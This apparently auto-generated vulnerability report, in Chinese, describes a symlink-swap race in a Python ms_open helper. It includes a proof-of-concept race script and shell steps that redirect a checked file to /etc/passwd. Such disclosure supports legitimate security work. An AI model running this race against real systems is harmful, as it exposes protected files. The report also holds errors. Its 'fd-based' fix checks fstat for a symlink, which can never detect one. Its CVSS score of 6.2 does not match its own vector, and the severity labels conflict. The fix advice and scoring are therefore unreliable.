# VULN-001-TOCTOU-MSOPEN：ms_open文件状态缓存致时间检查到使用竞态条件

## VULN-001-TOCTOU-MSOPEN: 时间检查到使用竞态条件 (CWE-367)

**严重性**: High  
**置信度**: 90%  
**CVSS 3.1 评分**: 6.2 (Medium)

---

## 1. 执行摘要

`ms_open()` 函数在安全检查和实际文件打开之间存在时间窗口（TOCTOU）。`FileStat` 对象在构造时缓存文件状态（`os.stat`），后续的安全检查使用缓存的状态而非实时状态。攻击者可在此时间窗口内替换文件为软链接，绕过安全检查访问非预期文件。

---

## 2. 根因分析

### 2.1 漏洞代码位置

**文件**: `ms_service_profiler/utils/file_open_check.py`  
**行号**: 320-358  
**函数**: `ms_open`

```python
def ms_open(file: str, mode: str = 'r', ...):
    # Step 1: 缓存文件状态（时间点 T1）
    file_stat = FileStat(file)  # line 322
    
    # Step 2: 使用缓存状态进行安全检查（时间点 T2）
    if not softlink and file_stat.is_softlink:  # line 335
        raise OpenException(...)
    
    # Step 3: 检查父目录安全（时间点 T3）
    safe_parent_msg = Rule.path().is_safe_parent_dir().check(file)  # line 343
    
    # Step 4: 实际打开文件（时间点 T4）- TOCTOU 窗口
    return os.fdopen(os.open(file, flags, mode=write_permission), mode)  # line 358
```

### 2.2 时间窗口分析

| 时间点 | 操作 | 状态 |
|--------|------|------|
| T1 | `FileStat(file)` | 缓存 `stat()` 结果 |
| T2 | `file_stat.is_softlink` | 检查缓存状态 |
| T3 | `Rule.path().check(file)` | 检查缓存父目录 |
| T4 | `os.open(file)` | 实际操作（可能已变化） |

**TOCTOU 窗口**: T1 到 T4 之间，文件可被替换。

---

## 3. 攻击路径

```
[攻击准备] 创建正常文件 /safe/data.txt
    ↓
[程序执行] ms_open("/safe/data.txt", "r")
    ↓
[Step 1-T1] FileStat 缓存: stat("/safe/data.txt") → 正常文件
    ↓
[攻击窗口] 攻击者在此窗口内:
    ↓ mv /safe/data.txt /tmp/real_data.txt
    ↓ ln -s /etc/passwd /safe/data.txt
    ↓
[Step 2-T2] file_stat.is_softlink → False (缓存值)
    ↓ 安全检查通过（使用旧状态）
[Step 4-T4] os.open("/safe/data.txt") → 打开软链接指向的文件
    ↓ 成功访问 /etc/passwd，绕过软链接检查
```

---

## 4. PoC 构造思路

### 4.1 竞态攻击脚本

```python
import os
import time
import threading

target_file = "/safe/data.txt"
real_target = "/etc/passwd"

def attacker_thread():
    while True:
        if os.path.exists(target_file):
            # 替换文件
            os.rename(target_file, "/tmp/real_data.txt")
            os.symlink(real_target, target_file)
            break

# 启动攻击线程
threading.Thread(target=attacker_thread).start()

# 触发 ms_open
result = ms_open(target_file, "r")
content = result.read()  # 可能读取到 /etc/passwd
```

### 4.2 利用条件

| 条件 | 要求 |
|------|------|
| 并发执行 | 攻击者需能同时执行替换操作 |
| 时间窗口 | 窗口足够大（微秒到毫秒级） |
| 文件权限 | 对目标目录有写权限 |

---

## 5. CVSS 3.1 评分

```
CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N
```

| 指标 | 值 | 说明 |
|------|-----|------|
| Attack Vector (AV) | Local (L) | 需本地访问 |
| Attack Complexity (AC) | High (H) | 需精确时间控制 |
| Privileges Required (PR) | None (N) | 无需特权 |
| User Interaction (UI) | None (N) | 无需交互 |
| Scope (S) | Unchanged (U) | 影响同一文件 |
| Confidentiality (C) | High (H) | 可读取任意文件 |
| Integrity (I) | None (N) | 仅读取 |
| Availability (A) | None (N) | 不影响可用性 |

**基础评分**: 6.2 (Medium)

---

## 6. 缓解建议

### 6.1 立即修复 (P0)

**方案 A: 使用 O_NOFOLLOW 打开**

```python
def ms_open(file: str, mode: str = 'r', ...):
    # 使用 O_NOFOLLOW 防止软链接跟随
    flags = os.O_RDONLY | os.O_NOFOLLOW
    try:
        fd = os.open(file, flags)
    except OSError as e:
        if e.errno == errno.ELOOP:  # 遇到软链接
            raise OpenException("Symlink detected at open time")
        raise
    return os.fdopen(fd, mode)
```

**方案 B: 使用 fd-based 检查**

```python
def ms_open(file: str, mode: str = 'r', ...):
    # 先打开获取 fd
    fd = os.open(file, os.O_RDONLY)
    
    # 使用 fd 获取实时状态（fstat）
    real_stat = os.fstat(fd)
    
    # 检查软链接（通过 fd）
    if stat.S_ISLNK(real_stat.st_mode):
        os.close(fd)
        raise OpenException("Symlink detected")
    
    # 继续处理...
    return os.fdopen(fd, mode)
```

### 6.2 短期缓解 (P1)

- 减少检查与操作之间的代码量
- 添加锁定机制防止并发修改
- 记录文件状态变化日志

---

## 7. 相关漏洞

| 漏洞 ID | 类型 | 关系 |
|---------|------|------|
| cpp_profiler_VULN_001 | TOCTOU | C++ 层相同问题 |
| cpp_profiler_VULN_004 | TOCTOU | dlopen 前 realpath |

---

**报告生成时间**: 2026-04-21  
**状态**: CONFIRMED